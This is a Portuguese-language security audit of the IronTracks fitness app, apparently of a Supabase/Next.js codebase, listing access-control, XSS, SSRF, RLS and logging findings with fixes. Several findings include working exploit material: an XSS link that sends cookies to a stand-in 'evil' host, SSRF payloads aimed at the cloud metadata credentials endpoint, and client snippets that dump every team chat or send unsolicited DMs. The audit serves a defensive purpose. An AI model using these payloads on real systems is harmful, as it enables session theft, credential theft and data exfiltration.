# IronTracks Security Audit
Data: 2026-05-13
Escopo: cold-read sem execução de banco/secrets reais. Foco em authz, OWASP Top 10 no stack, billing (RevenueCat/Apple IAP), storage, headers, leaks via logs.

---

## Resumo executivo

1. **`/api/admin/delete-auth-user` permite QUALQUER teacher deletar QUALQUER usuário do `auth.users`** — incluindo outros teachers, admin do sistema e alunos que não são seus. Catastrófico se um teacher mal-intencionado, ou um teacher com conta comprometida, descobrir o endpoint.
2. **XSS armazenado/refletido no `/auth/callback`** via parâmetro `next` (e o cookie `it.auth.next`). O valor é interpolado direto em atributo `href` HTML sem escape de aspas/`<>`. Auth-bypass cross-site, credential stealing trivial.
3. **RLS permissivo libera leitura cruzada de dados sociais/chat**: `team_chat_messages` tem `SELECT USING (true)` (qualquer usuário lê o chat de qualquer time); `direct_channels` permite INSERT com `user1_id OR user2_id = auth.uid()` e `direct_messages` só checa `sender_id` — qualquer usuário pode DMar qualquer outro sem invite/follow (spam/phishing vetor); bucket `chat-media` é **público sem limite de tamanho nem mime check**.
4. **SSRF em `/api/ai/bia-extract`**: validação `url.includes('/bioimpedance-files/')` é trivialmente burlada (`http://169.254.169.254/?/bioimpedance-files/`), com `redirect: 'follow'`. Permite probar metadata cloud, rede interna do Vercel, hosts internos.
5. **Open-redirect/XSS chain via OTP timing**: `verify-otp` compara `code !== record.otp_code` com `!==` (não constant-time → timing side-channel para descobrir OTP) e bucket `chat-media` autoassinado pelo cliente cria com `{ public: true }` (sem fileSizeLimit, sem allowedMimeTypes) — viabiliza armazenamento abusivo + entrega de malware.

---

## Findings (priorizados por risco real)

### 🔴 #1 — Privilege escalation: qualquer teacher deleta usuários arbitrários
**CWE-269 / OWASP A01 (Broken Access Control)**
- Localização: `/Volumes/SSD NVME 2TB/Projetos Antigravity/App IronTracks/src/app/api/admin/delete-auth-user/route.ts:44-78`
- O que é:
  - O check de autorização aceita `role === 'admin' || role === 'teacher'` (linha 53) **e** "existe linha em `teachers` com user_id = caller" (linha 60-62). Após isso, executa `admin.auth.admin.deleteUser(userId)` com **qualquer `userId` do corpo da requisição** (linha 75). A única salvaguarda é "não deletar a si mesmo".
- Exploit concreto:
  - Sou teacher legítimo do sistema. Faço POST `/api/admin/delete-auth-user` com `{ user_id: "<uuid-do-admin>", token: "<meu access token>" }`. Resultado: o usuário admin é deletado do `auth.users` (com cascata para profiles/teachers/students dependendo das FKs). Repito para todos os outros teachers + alunos: derrubo a base inteira em segundos.
  - Variação 1: teacher comprometido (phishing/reuso de senha) → atacante adquire essa primitiva.
  - Variação 2: usuário comum cria solicitação como "teacher", consegue aprovação → vira teacher → tem essa primitiva.
- Sugestão de fix:
  - Restringir a `role === 'admin'` (preferencialmente via `requireRole(['admin'])` para alinhar com o resto do código, ex. `simulate-teacher-payment/route.ts:44`).
  - Se o caso de uso é "teacher deleta aluno dele": validar `students.teacher_id = callerId` antes de deletar e bloquear quando `target.role !== 'student'`.

---

### 🔴 #2 — XSS via parâmetro `next` em `/auth/callback`
**CWE-79 / OWASP A03 (Injection)**
- Localização: `/Volumes/SSD NVME 2TB/Projetos Antigravity/App IronTracks/src/app/auth/callback/route.ts:101` (template HTML) + `src/utils/auth/safeRedirect.ts:21-30` (sanitizer insuficiente) + `src/app/auth/login/route.ts:82` (cookie sem escape).
- O que é:
  - `sanitizeNextParam` só rejeita: vazio, não começa com `/`, segundo char `//` ou `\\`, ou contém `:`. **Não escapa `"`, `<`, `>`, `'`.**
  - Em `callback/route.ts:101` o valor é interpolado dentro do atributo `href="${safeNext}"` (double-quoted) e no `JSON.stringify(safeNext)` (esse fica seguro).
  - O atributo `href` está em string aspas-duplas — uma aspa-dupla no payload fecha o atributo e permite injeção de novos atributos/tags.
- Exploit concreto:
  - Atacante envia link para vítima:
    `https://irontracks.com.br/auth/callback?code=qualquer&next=%2F%22%3E%3Cimg+src%3Dx+onerror%3Dfetch(%27https%3A%2F%2Fevil%2F%3Fc%3D%27%2Bdocument.cookie)%3E`
  - `safeNext` resultante: `/"><img src=x onerror=fetch('https://evil/?c='+document.cookie)>` — passa o sanitizer (começa com `/`, segundo char é `"`, sem `:`).
  - HTML renderizado vira `<a href="/"><img src=x onerror=...>"><script>...</script></a>`.
  - Como a resposta é servida pelo origin autenticado e roda **na mesma origin** logo após troca de cookie de sessão (linha 132-150 exchange exchangeCodeForSession), o `onerror` roda no contexto do usuário logado. Mesma ideia funciona via cookie `it.auth.next` (definido em `auth/login/route.ts:111` sem escape) para persistir.
  - Mitigado parcialmente pela CSP (`script-src 'self' 'nonce-...'`), mas atributos `onerror` **não exigem nonce** — eles disparam mesmo com CSP estrita, salvo se `'unsafe-inline'` estiver removido E `style-src-attr 'unsafe-inline'` for o único allow inline-attr (que **está** habilitado em `src/utils/security/headers.ts:13`). Vale a pena confirmar a versão exata do navegador alvo; em qualquer caso, `<svg onload=>` e outros payloads são ainda mais agressivos.
- Sugestão de fix:
  - Em `sanitizeNextParam`, rejeitar qualquer string que contenha caracteres fora de um whitelist (ex.: `/^[\w/\-._?=&%]+$/`).
  - No callback, escapar com `encodeURI(safeNext)` ou serializar 100% via `JSON.stringify` (que cobre o href se usado em `data:` ou via `<meta http-equiv="refresh">`).
  - Plano B: usar `NextResponse.redirect(new URL(safeNext, origin))` direto, sem renderizar HTML intermediário.

---

### 🔴 #3 — Spam/phishing: qualquer usuário envia DM para qualquer usuário (RLS gap)
**CWE-862 / OWASP A01 (Broken Access Control)**
- Localização: `supabase/migrations/20260309_rls_performance_optimization.sql:179-193` (policies `direct_channels`) + `:164-176` (policies `direct_messages`) + cliente `src/components/ChatDirectScreen.tsx:436` e `:478`.
- O que é:
  - INSERT em `direct_channels` aceita `WITH CHECK (user1_id = auth.uid() OR user2_id = auth.uid())`. Atacante seta `user1_id = atacante, user2_id = vítima_uuid` — passa.
  - INSERT em `direct_messages` exige só `sender_id = auth.uid()`. Nenhuma verificação de membership/invite/follow.
- Exploit concreto:
  - Pegue um `user.id` de outra pessoa via `/api/exercises/search` ou qualquer endpoint social que retorne ids. Use o cliente JS oficial:
    ```js
    const { data: c } = await supabase.from('direct_channels').insert({ user1_id: meuId, user2_id: vitimaId }).select().single()
    await supabase.from('direct_messages').insert({
      channel_id: c.id, sender_id: meuId, content: '{"type":"text","text":"PHISHING_AQUI"}'
    })
    ```
  - Vítima vê a mensagem (SELECT `sender OR receiver = auth.uid()` está em `direct_messages:166-171`). Combinado com `notifications/direct-message/route.ts`, atacante pode também forçar push se `users_share_private_channel` retornar true (já cria um direct_channel pra ele).
  - Impacto: phishing em massa dentro do app, distribuição de links maliciosos para a base inteira.
- Sugestão de fix:
  - Mover criação de `direct_channels` para uma RPC `SECURITY DEFINER` (`get_or_create_direct_channel` já existe em `teacher/inbox/send-message/route.ts:42`) e revogar INSERT direto via RLS.
  - Adicionar policy: `direct_channels INSERT` só permitido se existir relação aceita (teacher-student ativa, follow aceito, ou invite explícito).
  - Em `direct_messages INSERT`, validar via subquery que o `channel_id` pertence a um direct_channel onde `auth.uid() IN (user1_id, user2_id)`.

---

### 🔴 #4 — Bucket `chat-media` público sem limite de tamanho nem mime
**CWE-434 / OWASP A04 (Insecure Design)**
- Localização: `src/app/api/storage/ensure-bucket/route.ts:28` e `src/app/api/storage/signed-upload/route.ts:38` — `createBucket(name, { public: true })` sem `fileSizeLimit` nem `allowedMimeTypes`.
- O que é:
  - Comparar com `social-stories/signed-upload/route.ts:62` (que passa `fileSizeLimit: 200MB`, `public: false`) e `assessment/bia-attachment/signed-upload/route.ts:91-93` (também limita). Apenas `chat-media` é configurado público + sem limites.
  - O upload é por signed URL emitida pela rota, mas qualquer arquivo (ex: `.exe`, `.html` com JS, vídeo de 10 GB) é aceito.
- Exploit concreto:
  - Uso a primitiva do #3 pra criar `direct_channel` com o atacante e qualquer víima.
  - Faço POST `/api/storage/signed-upload` com o `channelId` do canal acabei de criar — `canUploadToChatMediaPath` (route.ts:154-175) consulta `direct_channels` e me autoriza porque eu sou um dos `user1_id/user2_id`.
  - Upload um HTML hostil de 5 GB. Como bucket é público, `https://<projeto>.supabase.co/storage/v1/object/public/chat-media/<channel>/<file>.html` serve o HTML com `text/html`. Posso vincular esse URL em qualquer mensagem direta como "media_url" e a vítima clica direto.
  - Custo do projeto explode (egress/storage), e tenho um phishing page hosted dentro do domínio Supabase do app (boa para confundir filtros corporativos).
- Sugestão de fix:
  - `createBucket('chat-media', { public: false, fileSizeLimit: 25 * 1024 * 1024, allowedMimeTypes: ['image/jpeg','image/png','image/webp','image/gif','video/mp4','video/quicktime'] })`.
  - Migrar leitura para URLs assinadas via `createSignedUrl` em vez de bucket público — assim só quem é membro do canal lê.

---

### 🔴 #5 — SSRF em `/api/ai/bia-extract`
**CWE-918 / OWASP A10 (SSRF)**
- Localização: `src/app/api/ai/bia-extract/route.ts:198` (check) + `:106` (fetch sem allowlist + `redirect: 'follow'`).
- O que é:
  - A única validação é `if (!url.includes('/bioimpedance-files/'))`. É um `includes`, não match de host/path.
- Exploit concreto:
  - Payload do atacante: `{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/?/bioimpedance-files/"}` — passa o check, é fetcheado pelo servidor.
  - O retorno HTTP é embutido como `inlineData` no Gemini. Mesmo que o conteúdo final não seja retornado bruto, a aplicação faz a chamada — abre o vetor de port-scanning interno (`http://127.0.0.1:8080/?/bioimpedance-files/`) e de credentials leak via metadata endpoint AWS/Azure/GCP (Vercel é AWS).
  - `redirect: 'follow'` torna pior: atacante hosta `https://attacker.com/redirect-to-169.254.169.254/?/bioimpedance-files/` e o servidor segue o redirect.
- Sugestão de fix:
  - Trocar pelo Supabase Storage SDK: `admin.storage.from('bioimpedance-files').download(path)` — não permite host arbitrário.
  - Se manter `fetch`, validar com `new URL(url)` + comparar `hostname === '<projeto>.supabase.co'` + path começar com `/storage/v1/object/public/bioimpedance-files/`.
  - Adicionar `redirect: 'manual'` e rejeitar 3xx.

---

### 🔴 #6 — `team_chat_messages` RLS `SELECT USING (true)` (data leak de todo chat de team)
**CWE-284 / OWASP A01**
- Localização: `supabase/migrations/20260310_team_chat_messages.sql:23-24`.
- O que é:
  - A policy diz literalmente "Anyone can read team chat" com `USING (true)`. O comentário acima diz "team sessions are already access-controlled" — mas isso só vale para os endpoints; o cliente Supabase-JS conecta direto e pode `select('*')` sem passar pelos endpoints.
- Exploit concreto:
  - Como usuário autenticado, via supabase-js no console do navegador:
    ```js
    const { data } = await supabase.from('team_chat_messages').select('*').limit(10000)
    ```
  - Retorna todas as mensagens de todos os times, incluindo `display_name`, `photo_url`, `content`. Treinos privados + conversas entre alunos vazam.
- Sugestão de fix:
  - Policy: `USING (EXISTS (SELECT 1 FROM team_sessions ts LEFT JOIN team_session_participants p ON p.session_id = ts.id WHERE ts.id::text = session_id AND (ts.teacher_id = auth_uid() OR p.user_id = auth_uid())))`.

---

### 🟡 #7 — Spoofing de nome do remetente em push de DM
**CWE-345 / OWASP A04**
- Localização: `src/app/api/notifications/direct-message/route.ts:30-33` e `:80-89`.
- O que é:
  - O endpoint exige `users_share_private_channel`, mas aceita `senderName` do corpo da requisição como `title` do push (não busca do `profiles.display_name` do `user.id`).
- Exploit concreto:
  - Bob (atacante) e Alice (vítima) já compartilham canal (por exemplo, são parte do mesmo grupo, ou Bob explorou #3). Bob chama o endpoint com `senderName: "IronTracks Suporte"` e `preview: "Sua conta foi suspensa. Clique aqui: https://evil.com"`. Alice recebe push com o título "IronTracks Suporte" — engenharia social trivial.
- Sugestão de fix:
  - Remover `senderName` do schema, buscar de `profiles.display_name` onde `id = user.id`.

---

### 🟡 #8 — Open-URL em `progress_photos.url` (sem allowlist de host)
**CWE-601 / OWASP A05**
- Localização: `src/app/api/progress-photos/route.ts:14-20`, schema com `z.string().url()` e nada mais.
- O que é:
  - Qualquer URL é aceita. Atacante grava `url: "https://evil-tracker.com/?victim_email=" + user.email + "&pixel.png"`. Quando outras telas renderizam essa foto, o servidor do atacante recebe tracking.
  - Não permite XSS direto (next/image valida `remotePatterns`), mas em endpoints que renderizam fora do next/image (PWA service worker pré-cache) o request sai do navegador da vítima — IP, user-agent vazam.
- Sugestão de fix:
  - Validar `new URL(url).hostname` está em allowlist (`res.cloudinary.com`, `<projeto>.supabase.co`, `firebasestorage.googleapis.com`).

---

### 🟡 #9 — Timing side-channel no OTP de cadastro
**CWE-208 / OWASP A02**
- Localização: `src/app/api/access-request/verify-otp/route.ts:71`: `if (code !== String(record.otp_code))`.
- O que é:
  - Comparação naïve `!==` curto-circuita no primeiro byte diferente. Existe `safeEqual` constant-time já no projeto (`src/utils/cron/auth.ts:9`, `src/utils/auth/route.ts:27`) — não foi aplicado aqui.
  - Combinado com 5 tentativas por OTP, em rede de baixa latência (mesmo PaaS), é viável descobrir 1-2 dígitos com timing e brute-force o resto.
- Exploit concreto:
  - Atacante conhece email/phone alvo. Solicita OTP. Mede timing nas 5 tentativas com prefixos diferentes. Pode reduzir o espaço de busca de 10^6 → 10^4. Solicita novo OTP, repete (rate-limit é 3 OTPs/10min, mas atacante paciente).
- Sugestão de fix:
  - Trocar para `safeEqual(code, String(record.otp_code))`.

---

### 🟡 #10 — Exposição de stack traces / mensagens de erro do banco em resposta JSON
**CWE-209 / OWASP A05**
- Localizações representativas (não exaustivo):
  - `src/app/api/billing/webhooks/revenuecat/route.ts:204` retorna `error.message` do PostgREST direto em 500.
  - `src/app/api/admin/workouts/sync-templates/route.ts:197, 210, 267` retorna `error.message` + `debug: { sourceUserId, templateIdsCount, ... }` quando `NODE_ENV === 'development'`. Está condicionado, mas vários outros endpoints retornam mensagem de erro do Supabase sem condição.
  - `src/app/api/account/delete/route.ts:122` retorna `getErrorMessage(e)`.
- O que é:
  - Mensagens do PostgREST/Supabase frequentemente vazam nome de coluna, tipo, hint SQL. Em produção isso ajuda atacante a mapear schema.
- Sugestão de fix:
  - Em produção, retornar erro genérico (`{ ok: false, error: 'internal' }`) e logar o real no Sentry/logger via `logError`. Já existe padrão (`/api/webhooks/whatsapp/route.ts:150` faz isso correto).

---

### 🟡 #11 — `progress-photos` usa `createAdminClient()` e bypassa RLS para SELECT/INSERT do próprio usuário
**CWE-269 / OWASP A04**
- Localização: `src/app/api/progress-photos/route.ts:26-34, 54-67` e `[id]/route.ts:20-28`.
- O que é:
  - Usa `createAdminClient()` (service_role) para queries que poderiam ser feitas com o cliente do usuário (`createClient()`), perdendo a defesa em camadas que RLS oferece.
  - Não é exploitable hoje porque o handler filtra por `eq('user_id', auth.user.id)`. Mas é code smell — se algum dia o filtro for esquecido (mesma estrutura repetida em dezenas de rotas), vira IDOR. O CLAUDE.md inclusive proíbe "endpoints que confiam só no client filtering"; aqui é o servidor filtrando, mas sem cinto de segurança do RLS.
- Sugestão de fix:
  - Usar `auth.supabase` (cliente user-scoped retornado por `requireUser()`). Já é o padrão em `vip/chat/messages/route.ts` etc.

---

### 🟡 #12 — `admin/access-requests/action/route.ts` injeta `full_name` cru em HTML de email
**CWE-79 (XSS via email) / OWASP A03**
- Localização: `src/app/api/admin/access-requests/action/route.ts:64-71`.
- O que é:
  - Template HTML do email: `<h2>Olá, ${name}!</h2>` onde `name` vem de `access_requests.full_name`, que veio direto do `create/route.ts` schema `z.string().min(1)` (sem limpeza). Atacante registra-se com `full_name: '<script>...</script>'`. Quando admin aceita, email enviado tem script inline.
  - A maioria dos clientes de email sandboxa scripts; risco real é injeção de imagem rastreadora / link enganoso. Médio.
- Sugestão de fix:
  - Escapar HTML antes de interpolar (`name.replace(/[<>&"']/g, c => ({'<':'&lt;','>':'&gt;','&':'&amp;','"':'&quot;',"'":'&#39;'}[c]))`).

---

### 🟡 #13 — `/api/storage/purge-chat-media` é primitiva destrutiva acessível por admin
**CWE-732**
- Localização: `src/app/api/storage/purge-chat-media/route.ts:6-58`.
- O que é:
  - Auth check: `hasValidInternalSecret(req) || requireRole(['admin'])`. Roda `admin.storage.from('chat-media').remove()` em batches sobre TODOS os arquivos do bucket + `DELETE` em `messages` e `direct_messages` que contenham `media_url`. Sem confirmação.
  - Não é uma vulnerabilidade clássica, mas qualquer XSS no painel admin (ou conta admin sequestrada) destrói histórico inteiro de mídia para todos os usuários. Lateral risk amplifier.
- Sugestão de fix:
  - Exigir doble-step confirmation token ou flag `confirm: 'IRREVOCABLE_PURGE'`.

---

### 🟡 #14 — Erro de mensagem de Supabase exposto em VIP / billing critical paths
**CWE-209**
- Localização: `src/app/api/billing/revenuecat/sync/route.ts:121, 135`, `src/app/api/billing/webhooks/revenuecat/route.ts:204, 226`, `src/app/api/billing/webhooks/mercadopago/route.ts:460`.
- O que é:
  - Webhooks RevenueCat / MercadoPago retornam `error.message` do PostgREST em 5xx. Webhooks são públicos (autenticados por bearer + signature), mas a resposta de erro ajuda quem está farejando o token.
- Sugestão de fix:
  - Mesma de #10. Specificamente para webhooks, retornar 500 sem corpo identificador.

---

### 🟢 #15 — `logError` não sanitiza o objeto `error` raw passado como `extra`
**CWE-532**
- Localização: `src/lib/logger.ts:37-42` — `console.error(..., extra !== undefined ? sanitize(extra) : error)`.
- O que é:
  - Se `extra` estiver definido, é sanitizado. Mas se for `undefined`, o `error` raw é logado. Errors do Supabase/Resend/etc podem conter tokens em mensagens. Em prod, console.error vai pro Vercel logs visíveis a quem tem acesso à organização.
- Sugestão de fix:
  - `console.error(..., sanitize(extra ?? error))`.

---

### 🟢 #16 — `getRequestIp` retorna `'unknown'` em ambientes sem XFF, agrupando rate-limit
**CWE-770**
- Localização: `src/utils/rateLimit.ts:48-63`.
- O que é:
  - Fallback `'unknown'` faz todo tráfego sem header virar a mesma chave de rate-limit. Em ambiente serverless cold, alguns chamadores podem cair nesse caminho. Não é exploit direto, mas degrada o rate-limit.
- Sugestão de fix:
  - Em produção, retornar 400 quando nem XFF nem x-real-ip estão presentes em rotas de auth/billing.

---

### 🟢 #17 — Header `X-XSS-Protection` é obsoleto e pode ser perigoso
**CWE-1023**
- Localização: `src/utils/security/headers.ts:30`.
- O que é:
  - `X-XSS-Protection: 1; mode=block` é deprecado e até reintroduz vulns em alguns navegadores antigos. CSP já cobre. Recomenda-se `0` ou remover.
- Sugestão de fix:
  - Remover ou setar `0`.

---

### 🟢 #18 — `recovery-code` e `verify-otp` usam Bearer key sem audit log de uso
**CWE-778**
- Localização: `src/app/api/auth/recovery-code/route.ts:54-67`.
- O que é:
  - Em caso de tentativa massiva (mesmo com rate-limit), não há trilha de auditoria por usuário. Difícil de detectar password reset takeover.
- Sugestão de fix:
  - Inserir em `audit_events` cada `verify_recovery_code_admin` (sucesso e falha), incluir IP e user-agent.

---

## Pontos sãos validados (auditados e OK)

- **CSP construído com nonce no middleware** (`src/utils/security/headers.ts:3-25`). Bloqueia inline scripts. Frame-ancestors none. `connect-src` restringe destinos da rede.
- **Cookies do Supabase** vêm via `getSupabaseCookieOptions()` aplicados consistentemente nos clientes server/middleware/browser.
- **`safePgFilter.ts`** sanitiza valores para `.or()` filters; é usado consistentemente em endpoints que misturam user input em filtros PostgREST.
- **Webhook signature verification** correto em `mercadopago/route.ts:26-37` (HMAC SHA-256 + tolerance window) e RevenueCat (`webhooks/revenuecat/route.ts:97`) com constant-time. RevenueCat tem replay protection via `cacheSetNx` (linha 119-129).
- **Rate-limit Upstash** sólido (`src/utils/rateLimit.ts`), com fallback in-memory + warning.
- **Constant-time compare** disponível em `cron/auth.ts:9` e `auth/route.ts:27` e usado em cron + RevenueCat.
- **OTP de phone**: armazenado com expires_at, max 5 tentativas, normalização de phone BR.
- **`access_requests` RLS** apertado para `WITH CHECK (status = 'pending')` (migration `20260418140000`), impedindo escalation via INSERT direto.
- **RLS de `direct_messages` para SELECT** corretamente checa `sender_id OR receiver_id`.
- **`chat_invites` RLS UPDATE** restringe transição de status (migration `20260419100000`).
- **PII scrubbing no logger** quando `extra` está presente (`logger.ts:8-23`).
- **Sentry `sendDefaultPii: false`** em `sentry.client.config.ts:17`.
- **Cookies CSRF OAuth** com `httpOnly + Secure (prod) + SameSite=Lax + path=/` em `oauthCsrf.ts:45-55`.
- **`scan:secrets`** rodou — zero hits.
- **STS / nosniff / X-Frame-Options DENY / Permissions-Policy** todos presentes.
- **`isSafeStoragePath`** valida ausência de path traversal (`..`, `\`, NUL).
- **HSTS** habilitado em produção (`headers.ts:40-41`).
- **Apple IAP / RevenueCat sync** endpoint usa `user.id` server-side (não confia em body), corretamente.
- **`approve_access_request` é RPC `SECURITY DEFINER`** com validação interna, transação atômica (`migrations/20260418120000`).

---

## Áreas não cobertas / honestas limitações da auditoria

- **Não rodei nenhum endpoint contra produção/staging.** Findings 1-6 são exploitáveis em leitura de código; severidade real depende de estado do banco (ex.: #1 depende de existir teacher acessível).
- **220 rotas de API.** Auditei profundamente as ~35 mais críticas (admin, billing, auth, storage, chat, IA). As ~185 restantes (workouts, exercises, marketplace, gym presence, etc.) tiveram só varredura por padrões (fetch, .or(), createAdminClient sem requireUser). Pode haver finds equivalentes a #11 nelas.
- **Não auditei o código nativo iOS (Swift/Capacitor plugins)** — push tokens, biometria, live activity podem ter issues de armazenamento de credenciais no Keychain.
- **Capacitor app bundle** — não verifiquei se `NEXT_PUBLIC_*` ou outros valores aparecem indevidamente no bundle iOS/Android (precisaria reverse engineer do IPA).
- **Storage RLS no Supabase Storage** — só inspecionei lado da API. Policies do Storage (em `storage.objects`) podem ter gaps complementares ao bucket público.
- **RPCs do Postgres** — algumas (`verify_recovery_code_admin`, `iron_rank_leaderboard`, `users_share_private_channel`, `approve_access_request`, `get_or_create_direct_channel`, `nutrition_add_meal_entry`, `save_workout_atomic`) não tive como inspecionar conteúdo (não estão nas migrations visíveis ou foram alteradas em produção sem migration). Vale revisar permissões e search_path.
- **Service Worker / PWA**: não auditei cache poisoning via SW, `instrumentation.ts`, ou Sentry tunnel route (`/monitoring`).
- **Capacitor deep links** (`com.irontracks.app://`) e Universal Links não auditei — possível open-redirect via app:// scheme.
- **`scan:async` retornou warnings** (botões sem disabled), mas são UX, não segurança — fora de escopo.
- **Não validei valor real de `IRONTRACKS_ADMIN_EMAIL`** nem secrets — apenas a forma de uso.
- **Race conditions de billing**: RC + MP têm replay protection (#dedup eventId). Race entre `sync/route.ts` e webhook é mitigada pelo `existing` SELECT + UPDATE/INSERT, mas em alta concorrência ainda pode duplicar entitlement (não inspecionei se há unique constraint efetivamente em `(user_id, provider)` ativa).

---
